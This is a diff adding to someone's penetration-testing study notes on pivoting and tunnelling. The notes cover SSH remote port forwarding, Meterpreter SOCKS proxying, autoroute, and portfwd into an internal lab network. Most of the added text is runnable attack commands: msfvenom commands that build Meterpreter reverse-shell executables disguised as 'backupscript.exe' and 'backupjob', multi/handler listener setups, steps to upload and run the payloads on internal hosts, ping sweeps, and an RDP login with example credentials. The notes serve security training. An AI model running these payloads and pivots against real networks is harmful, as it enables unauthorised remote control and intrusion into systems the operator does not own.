@@ -101,3 +101,206 @@ We can also use tools loke `xfreerdp`
 proxychains xfreerdp /v:$IP /u:$user /p:$password
 ```
 
+```ad-tldr
+In this section we learned how to forward a local port where SSH listenes on that port and forward a service on a remote host to our port.
+```
+
+---
+# Remote/Reverse Port Forwarding with SSH
+
+![[Remote Port Forwarding.png]]
+
+In the last image, we can't interact with the `Windows A` machine directly from our attacker host, because it's in an internal network that isn't accessible for us. That's why we have to use a **Pivot Server** (in our case `Ubuntu server`) to route our traffic to the internal network.
+
+In the following scenario we will use port 8080 on the Ubuntu server to forward all our reverse  packets to our attack hosts' 8000 port, where our Metasploit is running:
+#### Creating a Windows Payload with msfvenom
+
+```sh
+msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080
+```
+#### Configuring & Starting the multi/handler
+
+```sh
+use exploit/multi/handler
+set payload windows/x64/meterpreter/reverse_https
+set lhost 0.0.0.0
+set lport 8000
+run
+```
+
+After that, upload the payload to the Ubuntu server, and from there, upload it to the `Windows A` host to execute it there.
+
+Once the payload is on the targe machine we will **SSH Remote Port Forwarding** to forward the connection from Ubuntu server port 8080 to our `msfconsole` listener on port 8000.
+#### Using `SSH -R`
+
+```sh
+ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@$IP -vN
+```
+
+**Command Explanation:**
+- `-vN:` set to verbose and not prompt login shell
+- `-R:` forward all incoming connections on port 8080 to our Metasploit listener on port 8080
+
+![[Remote Port Forwarding Full Graph.png]]
+
+---
+# Meterpreter Tunneling & Port Forwarding
+
+In this case let's say we have a `meterpreter` shell on the Ubuntu server (our pivot host), and we want to perform enumeration scans through the pivot host on the internal network. 
+
+We can create a pivot using our `meterpreter` session without relying on SSH.
+#### Creating Payload for Ubuntu Pivot Host
+
+```sh
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080
+```
+#### Configuring & Starting the multi/handler
+
+```sh
+use exploit/multi/handler
+```
+
+After executing the payload on the pivot server and gaining a `meterpreter` shell, we can use `ping_sweep` module to check for live hosts on the network
+#### Ping Sweep
+
+```sh
+run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
+```
+
+We can also perform ping sweep using Shell, CMD, and PowerShell
+#### Ping Sweep For Loop on Linux Pivot Hosts
+
+```sh
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+```
+
+#### Ping Sweep For Loop Using CMD
+
+```powershell
+for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"
+```
+
+#### Ping Sweep Using PowerShell
+
+```powershell
+1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}
+```
+
+```ad-tip
+It is advised to do the ping sweep at least twice because the results may not be accurate from the first time.
+```
+
+In some cases, firewalls could be blocking ICMP so in that case we would need to perform a TCP scan on the targeted network using tools like `nmap`
+
+Instead of using SSH for port forwarding, we can use `SOCKS` proxy. There's a module in Metasploit for this called `socks_proxy` to configure a local proxy on our attack host.
+#### Configuring MSF's SOCKS Proxy
+
+![[Configure MSF SOCKS.png]]
+
+```sh
+use auxiliary/server/socks_proxy
+```
+#### Confirming Proxy Server is Running
+
+```sh
+jobs
+```
+#### Adding a Line to proxychains.conf if Needed
+
+```sh
+socks5 127.0.0.1 9050
+```
+#### Creating Routes with AutoRoute
+
+```sh
+msf6 > use post/multi/manage/autoroute 
+
+msf6 post(multi/manage/autoroute) > set SESSION 1 
+SESSION => 1 
+
+msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0 
+SUBNET => 172.16.5.0 
+
+msf6 post(multi/manage/autoroute) > run 
+
+[!] SESSION may not be compatible with this module: 
+[!] * incompatible session platform: linux 
+[*] Running module against 10.129.202.64 
+[*] Searching for subnets to autoroute. 
+[+] Route added to subnet 10.129.0.0/255.255.0.0 from host\'s routing table. 
+[+] Route added to subnet 172.16.5.0/255.255.254.0 from host\'s routing table. 
+[*] Post module execution completed
+```
+
+It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.
+
+```sh
+run autoroute -s 172.16.5.0/23
+```
+#### Listing Active Routes with AutoRoute
+
+```sh
+run autoroute -p
+```
+#### Testing Proxy & Routing Functionality
+
+```sh
+proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn
+```
+
+## Port Forwarding
+
+**Port Forwarding** can also be accomplished using the Metasploit Module `portfwd`
+We can enable a <span style="color:rgb(0, 176, 80)">listener</span> on our <span style="color:rgb(0, 176, 80)">attack host</span> and request <span style="color:rgb(192, 0, 0)">Meterpreter</span> to <span style="color:rgb(192, 0, 0)">forward</span> all packets received on this port <span style="color:rgb(192, 0, 0)">via our Meterpreter session</span> to a remote host on the <span style="color:rgb(0, 112, 192)">internal network</span>.
+#### Creating Local TCP Relay
+
+```sh
+meterpreter> portfwd add -l 3300 -p 3389 -r 172.16.5.19
+
+# Output
+[*] Local TCP relay created: :3300 <-> 172.16.5.19:3389
+```
+
+**Command Explanation:**
+
+- `-l` listen on our local port `3300`
+- `-r` forward all traffic to remote host `172.16.5.19` on port `3389`
+#### Connecting to Windows Target through localhost
+
+```sh
+xfreerdp /v:localhost:3300 /u:victor /p:pass@123
+```
+
+*tl;dr:* we forwarded the remote RDP port to our local port and connected to the remote host using it.
+
+## Meterpreter Reverse Port Forwarding
+
+Similar to local port forwarding, Metasploit can perform **reverse port forwarding**.
+#### Reverse Port Forwarding Rules
+
+```sh
+meterpreter> portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
+
+# Output
+[*] Local TCP relay created: 10.10.14.18:8081 <-> :1234
+```
+#### Starting Multi Handler
+
+```sh
+msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp 
+payload => windows/x64/meterpreter/reverse_tcp 
+
+msf6 exploit(multi/handler) > set LPORT 8081 
+LPORT => 8081 
+
+msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
+LHOST => 0.0.0.0 
+
+msf6 exploit(multi/handler) > run
+```
+#### Generating the Windows Payload
+
+```sh
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$Ubuntu_IP -f exe -o backupscript.exe LPORT=1234
+```
+
